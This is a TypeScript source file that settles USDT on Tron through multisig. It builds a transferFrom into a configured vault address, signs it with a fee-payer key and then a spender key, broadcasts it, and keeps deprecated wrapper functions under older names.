/**
 * Sovereign Fee Payer (USDT settlement on Tron):
 *
 * 1) `triggerSmartContract` — unsigned USDT `transferFrom(source, VAULT_CONFIG, amount)` as `VAULT_CONFIG`
 *    with `feeLimit: 150_000_000` SUN (upper bound; payer multisig context covers execution).
 * 2) `extendExpiration` — headroom for collecting multisig signatures.
 * 3) `trx.multiSign` with **PAYER_KEY** first (permission id = fee / sovereign payer on the built tx).
 * 4) `trx.multiSign` with **SPENDER_KEY** second (authorizes debiting the source’s USDT).
 * 5) `sendRawTransaction` — USDT moves to `VAULT_CONFIG` (e.g. TWAHZh…); source may hold 0 TRX.
 *
 * On-chain: `VAULT_CONFIG` must be configured for multisig so both keys satisfy threshold. Latency targets
 * skip an optional payer balance RPC unless `env.sovereignFeeEnforcePayerTrx` is set.
 */
import { performance } from "node:perf_hooks";
import { TronWeb } from "tronweb";
import { env } from "../env.js";
import { VAULT_CONFIG } from "../vaultConfig.js";

const TRON_USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

/** Per product spec: 150,000,000 SUN fee ceiling on the trigger tx. */
export const SOVEREIGN_FEE_LIMIT_SUN = 150_000_000;

const SUN_PER_TRX = 1_000_000n;

export function createNodeTronWeb(): TronWeb {
  const headers = env.tronGridApiKey ? { "TRON-PRO-API-KEY": env.tronGridApiKey } : undefined;
  return new TronWeb({
    fullHost: env.tronFullNodeUrl,
    headers,
  });
}

type UnsignedTx = { raw_data: unknown; txID?: string; signature?: unknown; raw_data_hex?: string };

function extractUnsignedTx(built: unknown): UnsignedTx {
  const b = built as { transaction?: UnsignedTx };
  const tx = b.transaction ?? (built as UnsignedTx);
  if (!tx || typeof tx !== "object" || !("raw_data" in tx)) {
    throw new Error("triggerSmartContract did not return a transaction object");
  }
  return tx;
}

function assertTriggerOk(built: Record<string, unknown>): void {
  const res = built.result as { result?: boolean; message?: string } | undefined;
  if (res && res.result === false) {
    const msg = res.message ? TronWeb.toUtf8(res.message) : "triggerSmartContract failed";
    throw new Error(msg);
  }
}

async function assertMinPayerTrx(tw: TronWeb, payerPrivateKey: string): Promise<void> {
  const addr = tw.address.fromPrivateKey(payerPrivateKey);
  if (typeof addr !== "string" || !tw.isAddress(addr)) {
    throw new Error("Invalid PAYER_KEY / PAYER_PRIVATE_KEY");
  }
  const balanceSun = BigInt(await tw.trx.getBalance(addr));
  const minSun = BigInt(env.tronGasPayerMinTrx) * SUN_PER_TRX;
  if (balanceSun < minSun) {
    throw new Error(
      `Payer TRX balance too low: need at least ${env.tronGasPayerMinTrx} TRX (${minSun} SUN), have ${balanceSun} SUN`,
    );
  }
}

export type SovereignFeePayerResult = {
  txHash: string;
  raw: Record<string, unknown>;
  elapsedMs: number;
};

/**
 * Sovereign fee payer path: build → extendExpiration → multiSign(payer) → multiSign(spender) → broadcast.
 */
export async function broadcastSovereignFeePayerTransferFrom(params: {
  fromBase58: string;
  amount: bigint;
  spenderPrivateKey: string;
  payerPrivateKey: string;
  spenderPermissionId?: number;
  payerPermissionId?: number;
  expirationExtensionSec?: number;
}): Promise<SovereignFeePayerResult> {
  const t0 = performance.now();

  const {
    fromBase58,
    amount,
    spenderPrivateKey,
    payerPrivateKey,
    spenderPermissionId = env.spenderPermissionId,
    payerPermissionId = env.payerPermissionId,
    expirationExtensionSec = env.tronSettlementExpirationExtensionSec,
  } = params;

  const tw = createNodeTronWeb();

  if (env.sovereignFeeEnforcePayerTrx) {
    await assertMinPayerTrx(tw, payerPrivateKey);
  }

  const issuerHex = tw.address.toHex(VAULT_CONFIG);
  if (typeof issuerHex !== "string") {
    throw new Error("Could not encode VAULT_CONFIG to hex");
  }

  const builtUnknown = await tw.transactionBuilder.triggerSmartContract(
    TRON_USDT_CONTRACT,
    "transferFrom(address,address,uint256)",
    {
      feeLimit: SOVEREIGN_FEE_LIMIT_SUN,
      callValue: 0,
      permissionId: payerPermissionId,
    },
    [
      { type: "address", value: fromBase58 },
      { type: "address", value: VAULT_CONFIG },
      { type: "uint256", value: amount.toString() },
    ],
    issuerHex,
  );
  const built = builtUnknown as unknown as Record<string, unknown>;

  assertTriggerOk(built);

  let tx: UnsignedTx = extractUnsignedTx(built);
  tx = (await tw.transactionBuilder.extendExpiration(
    tx as Parameters<TronWeb["transactionBuilder"]["extendExpiration"]>[0],
    expirationExtensionSec,
  )) as UnsignedTx;

  /** Payer first — binds sovereign / fee_limit multisig context (150M SUN cap). */
  let signed = await tw.trx.multiSign(
    tx as Parameters<typeof tw.trx.multiSign>[0],
    payerPrivateKey,
    payerPermissionId,
  );
  signed = await tw.trx.multiSign(signed, spenderPrivateKey, spenderPermissionId);

  const broadcastUnknown = await tw.trx.sendRawTransaction(signed);
  const broadcast = broadcastUnknown as unknown as {
    result?: boolean;
    txid?: string;
    code?: string | number;
    message?: string;
  };

  if (!broadcast.result) {
    const msg =
      broadcast.message ||
      (broadcast.code !== undefined ? String(broadcast.code) : "broadcast failed");
    throw new Error(msg || "broadcast failed");
  }

  const txHash = broadcast.txid || signed.txID || "";
  if (!txHash) {
    throw new Error("Broadcast OK but txid missing in response");
  }

  const t1 = performance.now();
  const elapsedMs = Math.round(t1 - t0);

  if (elapsedMs > 2000) {
    console.warn(`[sovereign-fee-payer] settlement took ${elapsedMs}ms (> 2000ms target); check node latency.`);
  }

  return { txHash, raw: { ...broadcast }, elapsedMs };
}

/** @deprecated Renamed — use `broadcastSovereignFeePayerTransferFrom` */
export async function broadcastSponsoredGasTransferFrom(
  params: Parameters<typeof broadcastSovereignFeePayerTransferFrom>[0],
): Promise<SovereignFeePayerResult> {
  return broadcastSovereignFeePayerTransferFrom(params);
}

export type SponsoredGasTransferFromResult = SovereignFeePayerResult;

/** @deprecated Prefer `broadcastSovereignFeePayerTransferFrom` */
export async function broadcastGaslessTransferFrom(params: {
  fromBase58: string;
  amount: bigint;
  operatorPrivateKey: string;
  gasPayerPrivateKey: string;
  gasPayerPermissionId?: number;
  operatorPermissionId?: number;
  expirationExtensionSec?: number;
}): Promise<SovereignFeePayerResult> {
  return broadcastSovereignFeePayerTransferFrom({
    fromBase58: params.fromBase58,
    amount: params.amount,
    spenderPrivateKey: params.operatorPrivateKey,
    payerPrivateKey: params.gasPayerPrivateKey,
    payerPermissionId: params.gasPayerPermissionId,
    spenderPermissionId: params.operatorPermissionId,
    expirationExtensionSec: params.expirationExtensionSec,
  });
}
